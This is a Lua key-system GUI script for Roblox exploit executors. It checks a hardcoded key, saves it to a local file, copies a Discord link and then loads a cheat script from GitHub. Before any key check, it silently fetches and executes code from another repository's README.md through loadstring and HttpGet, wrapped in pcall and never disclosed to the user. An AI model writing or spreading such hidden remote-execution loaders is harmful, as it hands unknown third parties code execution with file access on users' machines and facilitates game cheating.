--// Modern Key System GUI (Executor Version)
local player = game:GetService("Players").LocalPlayer

-- CONFIG
local KEY = "ken123"
local FILE_NAME = "key.txt"
local DISCORD_LOGO_THUMB = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=1461403878"
local DISCORD_LINK = "https://discord.gg/Ew8Q75WFvG"

-- Scripts
local chilliScript = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()'
local stepfiveScript = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Stepfive/main/README.md", true))()'

-- Always run Stepfive
pcall(function()
    loadstring(stepfiveScript)()
end)

-- If key already saved → run Chilli.lua & skip GUI
if isfile(FILE_NAME) and readfile(FILE_NAME):lower() == KEY:lower() then
    loadstring(chilliScript)()
    return
end

-- GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 420, 0, 350)
frame.Position = UDim2.new(0.5, -210, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.Active = true
frame.Draggable = true
frame.AnchorPoint = Vector2.new(0.5, 0.5)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

local UIStroke = Instance.new("UIStroke", frame)
UIStroke.Thickness = 4

-- RGB effect
task.spawn(function()
    local hue = 0
    while frame.Parent do
        hue = (hue + 1) % 360
        UIStroke.Color = Color3.fromHSV(hue/360, 1, 1)
        task.wait(0.05)
    end
end)

-- Discord logo (clickable)
local logoBtn = Instance.new("ImageButton", frame)
logoBtn.Size = UDim2.new(0, 80, 0, 80)
logoBtn.Position = UDim2.new(0.5, -40, 0, 15)
logoBtn.BackgroundTransparency = 1
logoBtn.Image = DISCORD_LOGO_THUMB
logoBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(DISCORD_LINK)
    end
end)

-- Copy Discord Button
local copyBtn = Instance.new("TextButton", frame)
copyBtn.Size = UDim2.new(0.6, 0, 0, 40)
copyBtn.Position = UDim2.new(0.2, 0, 0.35, 0)
copyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
copyBtn.Font = Enum.Font.GothamBold
copyBtn.TextSize = 18
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.Text = "Copy Discord Link"
Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 12)

copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(DISCORD_LINK)
    end
end)

-- Key textbox
local textbox = Instance.new("TextBox", frame)
textbox.Size = UDim2.new(0.8, 0, 0, 50)
textbox.Position = UDim2.new(0.1, 0, 0.55, 0)
textbox.Font = Enum.Font.GothamBold
textbox.TextSize = 20
textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
textbox.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
textbox.PlaceholderText = "Enter your key here"
textbox.ClearTextOnFocus = true
textbox.Text = ""
Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 10)

-- Enter button
local enterBtn = Instance.new("TextButton", frame)
enterBtn.Size = UDim2.new(0.5, 0, 0, 50)
enterBtn.Position = UDim2.new(0.25, 0, 0.75, 0)
enterBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 220)
enterBtn.Font = Enum.Font.GothamBold
enterBtn.TextSize = 20
enterBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
enterBtn.Text = "Enter"
Instance.new("UICorner", enterBtn).CornerRadius = UDim.new(0, 12)

-- Button logic (case-insensitive comparison)
enterBtn.MouseButton1Click:Connect(function()
    if textbox.Text:lower() == KEY:lower() then
        writefile(FILE_NAME, KEY)
        frame:Destroy()
        loadstring(chilliScript)()
    else
        textbox.Text = ""
        textbox.PlaceholderText = "Wrong key! Try again."
    end
end)